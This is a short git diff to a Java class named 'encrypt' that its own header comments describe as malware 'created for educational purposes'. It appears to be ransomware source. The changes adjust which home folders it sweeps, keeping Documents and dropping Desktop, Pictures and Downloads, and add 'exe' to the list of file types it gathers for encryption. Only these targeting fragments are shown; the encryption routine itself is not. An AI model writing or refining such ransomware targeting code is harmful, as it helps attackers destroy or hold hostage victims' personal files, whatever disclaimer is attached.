@@ -16,6 +16,7 @@ import java.util.Collection;
 
 /**
  * @author halq
+ * @since 24/05/2022
  * @author  swagkarna
  * @apiNote # I didn't make this code from 0, I got it from a friend and modified it #
  * @apiNote Malware created for educational purposes, I am not responsible for misuse
@@ -42,11 +43,7 @@ public class encrypt {
 
         ArrayList<String> CriticalPathList = new ArrayList<String>();
 
-
-        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
         CriticalPathList.add(System.getProperty("user.home") + "/Documents");
-        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");
-        CriticalPathList.add(System.getProperty("user.home") + "/Downloads");
 
         for (String TargetDirectory : CriticalPathList) {
 
@@ -54,7 +51,7 @@ public class encrypt {
 
             try {
 
-                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jar"};
+                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jar" ,"exe"};
 
                 Collection files = FileUtils.listFiles(root, extensions, true);
 
